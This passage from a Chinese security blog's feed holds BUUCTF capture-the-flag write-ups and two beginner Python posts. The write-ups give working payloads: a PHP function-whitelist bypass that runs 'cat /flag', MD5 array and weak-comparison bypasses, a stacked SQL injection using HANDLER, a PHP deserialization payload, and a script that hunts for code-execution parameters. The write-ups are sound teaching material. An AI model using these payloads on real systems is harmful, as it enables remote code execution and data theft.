class="line">?c&#x3D;system(&quot;cat &#x2F;flag&quot;)</span><br></pre></td></tr></table></figure><p>但是上面列出来白名单和黑名单，关键字符会被过滤，要求我们绕过。</p><p>比如这样就是被过滤了：</p><p><img src="/2021/07/30/buu/4/image-20210802091253839.png" alt="image-20210802091253839"></p><p>我们不能输入引号和system函数</p><p>但引号去掉也可执行，然后再采用变量保存函数和参数。</p><p>且用白名单里的函数代替得</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;($_GET[pi])($_GET[abs])&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><p>不过，_GET并没有在白名单内,[ ]也被过滤。</p><p>所以</p><p>1.[ ]可以用{}替换</p><p>2._GET用hex2bin转换</p><p><a href="https://www.rapidtables.org/zh-CN/convert/number/ascii-to-hex.html">ASCII到十六进制| 文本到十六进制代码转换器 (rapidtables.org)</a></p><p><img src="/2021/07/30/buu/4/image-20210802092247741.png" alt="image-20210802092247741"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_GET&#x3D;hex2bin(5f 47 45 54)</span><br></pre></td></tr></table></figure><p>  这里用到的hex2bin也是名单之外</p><p>  需要用base_convert函数转换</p><p>（用base_convert()函数将10进制数转化为32进制的hex2bin）</p><p><a href="https://tool.oschina.net/hexconvert">在线进制转换 (oschina.net)</a></p><p><img src="/2021/07/30/buu/4/image-20210802092841841.png" alt="image-20210802092841841"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hex2bin&#x3D;base_convert(37907361743,10,36)</span><br></pre></td></tr></table></figure><p>数字也不能直接填</p><p>因为之前的正则表达式会过滤掉。</p><p><code>preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);</code> 这句话当作函数名放进白名单里检测</p><p>所以<code>5f 47 45 54</code>需要转换</p><p>而dechex() 函数把十进制数转换为十六进制数。</p><p><img src="/2021/07/30/buu/4/image-20210802093324856.png" alt="image-20210802093324856"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5f474554&#x3D;dechex(1598506324)</span><br></pre></td></tr></table></figure><p>所以有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_GET&#x3D;hex2bin(5f 47 45 54)&#x3D;base_convert(37907361743,10,36)(dechex(1598506324))</span><br></pre></td></tr></table></figure><p>接着将_GET存在一个变量里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));</span><br></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure><p><img src="/2021/07/30/buu/4/image-20210802094315328.png" alt="image-20210802094315328"></p><p>本文章参考于：(<a href="https://blog.csdn.net/missht0/article/details/113244707">https://blog.csdn.net/missht0/article/details/113244707</a>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    这是一道非常好的绕过题目。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/30/buu/4/image-20210730151757624.png&quot; alt=&quot;image-20210730151757624&quot;&gt;&lt;/p&gt;
&lt;p&gt;附上源码：&lt;/p&gt;
&lt;figur</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF2020 Ez_bypass&amp;GYCTF2020 Blacklist</title>
    <link href="http://daweitech.github.io/2021/07/27/buu/3/"/>
    <id>http://daweitech.github.io/2021/07/27/buu/3/</id>
    <published>2021-07-27T09:20:15.000Z</published>
    <updated>2021-07-27T13:08:23.202Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>打开靶机：</p><p><img src="/2021/07/27/buu/3/image-20210727172208110.png" alt="image-20210727172208110"></p><p>按照提示</p><p>进入f12中</p><p><img src="/2021/07/27/buu/3/image-20210727172249158.png" alt="image-20210727172249158"></p><p>代码审计一下：</p><p>里面包含了名为flag.php的文件，flag的格式也进行了说明</p><p>接下来要处理两个变量，gg和id</p><p>第一个if判断的是两个变量md5值相同但是其本身却不能相等</p><p>我查找到了有关资料</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5不能处理数组，处理任意数组返回值都相同</span><br></pre></td></tr></table></figure><p>所以我们直接这样赋值</p><p>?id[]=1&amp;gg[]=2</p><p>成功达成第一个条件：</p><p><img src="/2021/07/27/buu/3/image-20210727172710626.png" alt="image-20210727172710626"></p><p>接着看看第二个if需要完成什么</p><p>提示我们POST传参passwd变量</p><p>其值不能为数字型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;是恒等计算符  同时检查表达式的值与类型</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;是比较运算符号  不会检查条件式的表达式的类型</span><br></pre></td></tr></table></figure><p>之后的比较同样满足条件。思路有了，</p><p>不过我做法错了，跟以前弱口令什么的混起来了，疯狂尝试了‘123456a’无果</p><p>看了wp后才知道，其实不用加分号，直接passwd=1234567a，这里已经是字符型了。</p><p>一剑封喉：</p><p><img src="/2021/07/27/buu/3/image-20210727173223649.png" alt="image-20210727173223649"></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>打开靶机后，明显注入题。</p><p><img src="/2021/07/27/buu/3/image-20210727204621570.png" alt="image-20210727204621570"></p><p>wp来源：<a href="https://www.cnblogs.com/20175211lyz/p/12356678.html">https://www.cnblogs.com/20175211lyz/p/12356678.html</a></p><h4 id="姿势-堆叠注入"><a href="#姿势-堆叠注入" class="headerlink" title="姿势-堆叠注入"></a>姿势-堆叠注入</h4><p>获取库名、表名、列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">show tables;</span><br><span class="line">show columns from &#96;table_name&#96;;</span><br></pre></td></tr></table></figure><p>试着查询了一下数据库名、表名和段名（<strong>这里没有用之前传统的联合查询，因为自己尝试查询之后发现后面会被正则表达式过滤</strong>）：</p><p>ps：不过我不太清楚为什么这里查询要 ‘ 加上 ；</p><p><img src="/2021/07/27/buu/3/image-20210727204959368.png" alt="image-20210727204959368"></p><p><img src="/2021/07/27/buu/3/image-20210727205248791.png" alt="image-20210727205248791"></p><p>出现了flag字样，然后用大佬的方法，</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</span><br></pre></td></tr></table></figure><p>官方解释是：</p><p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，</p><p>该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p><h4 id="Tip："><a href="#Tip：" class="headerlink" title="Tip："></a>Tip：</h4><p>本来应该还有一种姿势是修改表名，但是修改表名的关键字rename和alert都被正则ban掉，所以不能用</p><p>这题若是改造之前的强网杯2019随便注一题则可以用此方法。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;MRCTF2020-Ez-bypass&quot;&gt;&lt;a href=&quot;#MRCTF2020-Ez-bypass&quot; class=&quot;headerlink&quot; title=&quot;[MRCTF2020]Ez_bypass&quot;&gt;&lt;/a&gt;[MRCTF2020]Ez_bypass&lt;/h2&gt;&lt;p&gt;</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯 2020 青龙组AreUSerialz</title>
    <link href="http://daweitech.github.io/2021/07/26/buu/2/"/>
    <id>http://daweitech.github.io/2021/07/26/buu/2/</id>
    <published>2021-07-26T11:46:37.000Z</published>
    <updated>2021-07-27T12:49:24.565Z</updated>
    
    <content type="html"><![CDATA[<p>​    打开后，出现代码页面</p><p><img src="/2021/07/26/buu/2/image-20210726194801767.png" alt="image-20210726194801767"></p><p>​    处理到vs上</p><p><img src="/2021/07/26/buu/2/image-20210726194850909.png" alt="image-20210726194850909"></p><p>接着我们逐段分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p>​    包含了名为flag.php的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">protected $op;</span><br><span class="line"></span><br><span class="line">protected $filename;</span><br><span class="line"></span><br><span class="line">protected $content;</span><br></pre></td></tr></table></figure><p>​    受保护方法的三个变量</p><p>接下来是借鉴了大佬博客</p><p>经过分析，这个题目需要传入一个序列化之后的类对象（因为最后的valid函数会进行一步反序列化），并且要绕过两层防护：</p><p>两个防护：<br><strong>is_valid()</strong><br>要求我们传入的str的每个字母的ascii值在32和125之间。因为protected属性在序列化之后会出现不可见字符\00*\00，不符合上面的要求。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function is_valid($s) &#123;</span><br><span class="line"></span><br><span class="line">  for($i &#x3D; 0; $i &lt; strlen($s); $i++)</span><br><span class="line"></span><br><span class="line">​    if(!(ord($s[$i]) &gt;&#x3D; 32 &amp;&amp; ord($s[$i]) &lt;&#x3D; 125))</span><br><span class="line"></span><br><span class="line">​      return false;</span><br><span class="line"></span><br><span class="line">  return true;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用到了python的ord函数：</p><p>[^]: ord () 函数是 chr () 函数（对于8位的ASCII字符串）或 unichr () 函数（对于Unicode对象）的配对函数，它以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值</p><p>绕过方法：因为php7.1以上的版本对属性类型不敏感，所以可以将属性改为public，public属性序列化不会出现不可见字符</p><p><strong>destruct()魔术方法</strong><br>op===”2”，是强比较，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function __destruct() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D;&#x3D; &quot;2&quot;)</span><br><span class="line">            $this-&gt;op &#x3D; &quot;1&quot;;</span><br><span class="line">        $this-&gt;content &#x3D; &quot;&quot;;</span><br><span class="line">        $this-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> <strong>而在process()函数中,</strong></p><p>op==”2”是弱比较</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public function process() &#123;</span><br><span class="line">        if($this-&gt;op &#x3D;&#x3D; &quot;1&quot;) &#123;</span><br><span class="line">            $this-&gt;write();</span><br><span class="line">        &#125; else if($this-&gt;op &#x3D;&#x3D; &quot;2&quot;) &#123;</span><br><span class="line">            $res &#x3D; $this-&gt;read();</span><br><span class="line">            $this-&gt;output($res);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;output(&quot;Bad Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p> 绕过方法：可以使传入的op是数字2，从而使第一个强比较返回false,而使第二个弱比较返回true.</p><p><img src="/2021/07/26/buu/2/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JBQkNEWEI=,size_16,color_FFFFFF,t_70" alt="img"></p><p>绕过之后，就是到了关键一步，要进行本地序列化操作：</p><p>我直接照搬了大佬的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class FileHandler &#123;</span><br><span class="line"></span><br><span class="line">    public  $op &#x3D; 2;</span><br><span class="line">    public  $filename &#x3D; &quot;flag.php&quot;;</span><br><span class="line">    public  $content &#x3D; &quot;1&quot;;        &#x2F;&#x2F;因为destruce函数会将content改为空，所以content的值随意（但是要满足is_valid()函数的要求）</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a &#x3D; new FileHandler();</span><br><span class="line">$b &#x3D; serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>访问xu.php</p><p><img src="/2021/07/26/buu/2/image-20210726200434420.png" alt="image-20210726200434420"></p><p>​        构建payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?str&#x3D;O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure><p>​        F12得到flag：</p><p><img src="/2021/07/26/buu/2/image-20210726200827967.png" alt="image-20210726200827967"></p><p>本文借鉴于：[<a href="https://blog.csdn.net/RABCDXB/article/details/114297291">网鼎杯 2020 青龙组]AreUSerialz_RABCDXB的博客-CSDN博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    打开后，出现代码页面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/07/26/buu/2/image-20210726194801767.png&quot; alt=&quot;image-20210726194801767&quot;&gt;&lt;/p&gt;
&lt;p&gt;​    处理到vs上&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>强网杯 2019高明的黑客</title>
    <link href="http://daweitech.github.io/2021/07/26/buu/1/"/>
    <id>http://daweitech.github.io/2021/07/26/buu/1/</id>
    <published>2021-07-26T02:28:08.000Z</published>
    <updated>2021-07-26T13:39:08.736Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/07/26/buu/1/image-20210726102939511.png" alt="image-20210726102939511"></p><p>打开靶机后，网页提示下载源码：<a href="http://www.tar.gz/">www.tar.gz</a> </p><p>猜测里面包含可以利用的漏洞文件。</p><p>然后开始了漫长的下载。。。</p><p>下载完成后，我们发现里面包含的文件挺多的，而且是很多都为木马文件，所以排除了用360侦测出目标文件。</p><p>查看某些文件发现可以利用GET和POST传参利用。</p><p>找到大佬写的脚本，用python来跑就不用一个个试了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import threading</span><br><span class="line">import time</span><br><span class="line">print(&#39;开始时间：  &#39;+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1&#x3D;threading.Semaphore(100)    #这儿设置最大的线程数</span><br><span class="line">filePath &#x3D; r&quot;D:&#x2F;soft&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;src&#x2F;&quot;</span><br><span class="line">os.chdir(filePath)#改变当前的路径</span><br><span class="line">requests.adapters.DEFAULT_RETRIES &#x3D; 5#设置重连次数，防止线程数过高，断开连接</span><br><span class="line">files &#x3D; os.listdir(filePath)</span><br><span class="line">session &#x3D; requests.Session()</span><br><span class="line">session.keep_alive &#x3D; False # 设置连接活跃状态为False</span><br><span class="line">def get_content(file):</span><br><span class="line">    s1.acquire()</span><br><span class="line">    print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    with open(file,encoding&#x3D;&#39;utf-8&#39;) as f:#打开php文件，提取所有的$_GET和$_POST的参数</span><br><span class="line">            gets &#x3D; list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">            posts &#x3D; list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))</span><br><span class="line">    data &#x3D; &#123;&#125;#所有的$_POST</span><br><span class="line">    params &#x3D; &#123;&#125;#所有的$_GET</span><br><span class="line">    for m in gets:</span><br><span class="line">        params[m] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;</span><br><span class="line">    for n in posts:</span><br><span class="line">        data[n] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;</span><br><span class="line">    url &#x3D; &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;src&#x2F;&#39;+file</span><br><span class="line">    req &#x3D; session.post(url, data&#x3D;data, params&#x3D;params)#一次性请求所有的GET和POST</span><br><span class="line">    req.close()# 关闭请求  释放内存</span><br><span class="line">    req.encoding &#x3D; &#39;utf-8&#39;</span><br><span class="line">    content &#x3D; req.text</span><br><span class="line">    #print(content)</span><br><span class="line">    if &quot;xxxxxx&quot; in content:#如果发现有可以利用的参数，继续筛选出具体的参数</span><br><span class="line">        flag &#x3D; 0</span><br><span class="line">        for a in gets:</span><br><span class="line">            req &#x3D; session.get(url+&#39;?%s&#x3D;&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)</span><br><span class="line">            content &#x3D; req.text</span><br><span class="line">            req.close()# 关闭请求  释放内存</span><br><span class="line">            if &quot;xxxxxx&quot; in content:</span><br><span class="line">                flag &#x3D; 1</span><br><span class="line">                break</span><br><span class="line">        if flag !&#x3D; 1:</span><br><span class="line">            for b in posts:</span><br><span class="line">                req &#x3D; session.post(url, data&#x3D;&#123;b:&quot;echo &#39;xxxxxx&#39;;&quot;&#125;)</span><br><span class="line">                content &#x3D; req.text</span><br><span class="line">                req.close()# 关闭请求  释放内存</span><br><span class="line">                if &quot;xxxxxx&quot; in content:</span><br><span class="line">                    break</span><br><span class="line">        if flag &#x3D;&#x3D; 1:#flag用来判断参数是GET还是POST，如果是GET，flag&#x3D;&#x3D;1，则b未定义；如果是POST，flag为0，</span><br><span class="line">            param &#x3D; a</span><br><span class="line">        else:</span><br><span class="line">            param &#x3D; b</span><br><span class="line">        print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; %param)</span><br><span class="line">        print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line">for i in files:#加入多线程</span><br><span class="line">   t &#x3D; threading.Thread(target&#x3D;get_content, args&#x3D;(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure><p><img src="/2021/07/26/buu/1/image-20210726114732836.png" alt="image-20210726114732836"></p><p>真的太膜拜了，单线程的脚本我都不会写。。。</p><p>如图找到了可利用参数和文件</p><p>接下来就是进行访问对应文件来进行利用</p><p>结果如图</p><p><img src="/2021/07/26/buu/1/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(301).png" alt="屏幕截图(301)"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/07/26/buu/1/image-20210726102939511.png&quot; alt=&quot;image-20210726102939511&quot;&gt;&lt;/p&gt;
&lt;p&gt;打开靶机后，网页提示下载源码：&lt;a href=&quot;http://www.tar.gz/</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>python_tip</title>
    <link href="http://daweitech.github.io/2021/07/22/python/python_tip/"/>
    <id>http://daweitech.github.io/2021/07/22/python/python_tip/</id>
    <published>2021-07-22T00:12:49.000Z</published>
    <updated>2021-07-22T01:05:33.167Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Part1"><a href="#Part1" class="headerlink" title="Part1"></a>Part1</h3><p>搭建python的编程环境：subline text、pycharm……</p><h3 id="Part2"><a href="#Part2" class="headerlink" title="Part2"></a>Part2</h3><p>变量，eg：message  =  ‘’Hello World”</p><p>​                    print(message)</p><p>输出：Hello World，这里我们添加了一个名为message的变量，它指向的值为文本“Hello World”。</p><p>在程序中可随时改变变量的值，而python将始终记录变量的最新值。</p><p>变量命名条件：</p><p>​                        1.只能包含数字、字母和下划线。且开头只能以字母或下划线开头，不能以数字开头。</p><p>​                        2.不能包含空格，但可以使用下划线来分隔其中的单词。</p><p>​                        3.勿将python关键字和函数名作为变量名。</p><p>​                        4.应该简短又具有描述性。</p><p>​                        5.数字1和字母l，数字0和字母o要注意区分。</p><p>若出现错误时，往往可以见到    Traceback（most recent call most）的解释器告知错误。</p><p>字符串，就是一系列字符，用引号括起的都是字符串，单双引号皆可。</p><p>“This is a string.”</p><p>‘This is a string.’</p><p>方法修改字符大小写：变量名.title()，首字母大写</p><p>​                                       变量名.upper()，全部大写</p><p>​                                        变量名.lower()，全部小写</p><p>字符串的组合，引号里加上中括号，eg：</p><p>​    <code>first_name = &quot;ada&quot;</code></p><p>​    <code>last_name = &quot;lovelace&quot;</code></p><p>​    <code>full_name = f&quot;&#123;first_name&#125; &#123;last_name&#125;&quot;</code></p><p>​    <code>print(full_name)</code></p><p>这里的字符串命名为f字符串，f是format（设置格式）的简写。</p><p>添加空白：空格、制表符、换行符， /t, /n</p><p>删除空白：方法rstrip</p><p>同时给多个变量赋值：x，y，z = 0，0，0</p><p>常量：在代码中，要指出应将特定的变量视为常量，可将其字母全部大写。</p><p>注释：句子前加#号。</p><h3 id="Part3"><a href="#Part3" class="headerlink" title="Part3"></a>Part3</h3>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;Part1&quot;&gt;&lt;a href=&quot;#Part1&quot; class=&quot;headerlink&quot; title=&quot;Part1&quot;&gt;&lt;/a&gt;Part1&lt;/h3&gt;&lt;p&gt;搭建python的编程环境：subline text、pycharm……&lt;/p&gt;
&lt;h3 id=&quot;Part2&quot;&gt;&lt;a</summary>
      
    
    
    
    
    <category term="python" scheme="http://daweitech.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python_visual</title>
    <link href="http://daweitech.github.io/2021/07/19/python/python-visual/"/>
    <id>http://daweitech.github.io/2021/07/19/python/python-visual/</id>
    <published>2021-07-19T12:47:18.000Z</published>
    <updated>2021-07-20T02:39:57.707Z</updated>
    
    <content type="html"><![CDATA[<p>​    使用Plotly可视化仓库</p><p>​    创建了可视化python图表，以html形式呈现</p><p><img src="/2021/07/19/python/python-visual/image-20210719204819823.png" alt="image-20210719204819823"></p><p>上图为Github上python库受欢迎程度</p><p>代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">from plotly.graph_objs import Bar</span><br><span class="line">from plotly import offline</span><br><span class="line"></span><br><span class="line">#执行API调用并存储响应</span><br><span class="line">url &#x3D; &#39;https:&#x2F;&#x2F;api.github.com&#x2F;search&#x2F;repositories?q&#x3D;language:python&amp;sort&#x3D;stars&#39;</span><br><span class="line">headers &#x3D; &#123;&#39;Accept&#39;:&#39;application&#x2F;vnd.github.v3+json&#39;&#125;</span><br><span class="line">r &#x3D; requests.get(url,headers&#x3D;headers)</span><br><span class="line">print(f&quot;Status code: &#123;r.status_code&#125;&quot;)</span><br><span class="line">response_dict &#x3D; r.json()</span><br><span class="line">repo_dicts &#x3D; response_dict[&#39;items&#39;]</span><br><span class="line">repo_names,stars &#x3D; [], []</span><br><span class="line">for repo_dict in repo_dicts:</span><br><span class="line">    repo_names.append(repo_dict[&#39;name&#39;])</span><br><span class="line">    stars.append(repo_dict[&#39;stargazers_count&#39;])</span><br><span class="line"></span><br><span class="line">#可视化</span><br><span class="line">data &#x3D; [&#123;</span><br><span class="line">    &#39;type&#39;: &#39;bar&#39;,</span><br><span class="line">    &#39;x&#39;: repo_names,</span><br><span class="line">    &#39;y&#39;:stars,</span><br><span class="line">&#125;]</span><br><span class="line">my_layout &#x3D; &#123;</span><br><span class="line">    &#39;title&#39;:&#39;Github上最受欢迎的Python项目&#39;,</span><br><span class="line">    &#39;xaxis&#39;:&#123;&#39;title&#39;: &#39;Repository&#39;&#125;,</span><br><span class="line">    &#39;yaxis&#39;:&#123;&#39;title&#39;:&#39;Stars&#39;&#125;,</span><br><span class="line">&#125;</span><br><span class="line">fig &#x3D; &#123;&#39;data&#39;: data, &#39;layout&#39;:my_layout&#125;</span><br><span class="line">offline.plot(fig, filename&#x3D;&#39;python_repos.html&#39;)</span><br></pre></td></tr></table></figure><p>Status code: 200 ，意味着访问成功。</p><p>Tips:如果遇到代码运行失败并且是出现了如下类似错误</p><hr><p>Traceback (most recent call last)<br><strong>C:\Users\mr-chen\Anaconda3\envs\hadoop\lib\site-packages\urllib3\connection.py in _new_conn(self)</strong><br> 158             conn = connection.create_connection(</p><hr><p>这是因为url路径为GitHub的网站，对于国内访问的我们来说不稳定</p><p>即使添加进了hosts文件也偶尔会出现访问失败的情况</p><p>在代码运行是就会出现上述traceback报错报告。</p><p>找到解决方法的相关文章来源于：</p><p><a href="https://blog.csdn.net/visoprkx/article/details/88925116">使用python pyhdfs操作hadoop 出现ConnectionError: HTTPConnectionPool(host=’bigdata-senior03.chybinmy.com’_visoprkx的专栏-CSDN博客</a></p><p>改进Plotly图表、添加自定义工具提示、在图表中添加可单击的链接后的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 